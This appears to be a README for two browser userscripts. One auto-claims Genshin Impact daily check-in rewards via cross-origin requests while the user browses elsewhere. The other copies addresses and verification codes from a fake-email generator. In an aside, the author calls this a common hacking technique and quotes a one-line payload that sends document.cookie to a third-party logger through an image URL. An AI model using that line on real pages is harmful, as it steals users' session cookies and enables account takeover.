## genshin-checkin-redeem.js
(requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
#### NOTE: Only the account that is currently logged in, I may make a script for quick multi-account in few lines(C#) in the future!<br>
Every 3h script will try to check-in<br>
__Script will trigger when you are casually watching youtube videos, or just browsing__<br>
This script will send 2 requests, one will attempt to get checkin game reward, and the other request is another checkin<br>
I have tested it on other accounts and it should be working for you as well<br>
#### ALL SERVERS
Junior Developers may freak out because they'll see error(s) in the console, in the contrary `it just worksâ„¢` because request is sent, but the response cannot arrive due CORS
- This technique is very common in Hacking
  - It was being used for DoS-ing
  - Or sending `document.cookie` to the 3rd party logger website
    - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`

## quickfmg.js
(requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
Once you add this script and go to [fakemailgenerator.com](http://www.fakemailgenerator.com/), you would click on Logo that will have green background.<br>
Once you click on the Logo, it will copy the new generated mail automatically<br>
IMPORTANT: It will copy verification code for genshin impact account, no worries
